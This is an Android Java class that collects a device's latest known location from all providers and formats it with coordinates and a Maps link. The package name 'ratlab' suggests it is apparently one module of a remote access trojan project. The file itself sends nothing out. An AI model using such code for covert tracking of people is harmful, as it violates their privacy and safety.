package com.ratlab;

import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import java.util.List;

public class LocationModule {

    private final Context ctx;

    public LocationModule(Context ctx) {
        this.ctx = ctx;
    }

    @SuppressLint("MissingPermission")
    public String get() {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location best = null;
            for (String p : lm.getProviders(true)) {
                Location loc = lm.getLastKnownLocation(p);
                if (loc != null && (best == null || loc.getTime() > best.getTime())) {
                    best = loc;
                }
            }
            if (best == null) return "Lokasi tidak tersedia";
            return "Lat: " + best.getLatitude() + "\n"
                    + "Lng: " + best.getLongitude() + "\n"
                    + "Akurasi: " + best.getAccuracy() + " m\n"
                    + "Provider: " + best.getProvider() + "\n"
                    + "Maps: https://maps.google.com/?q=" + best.getLatitude() + "," + best.getLongitude();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
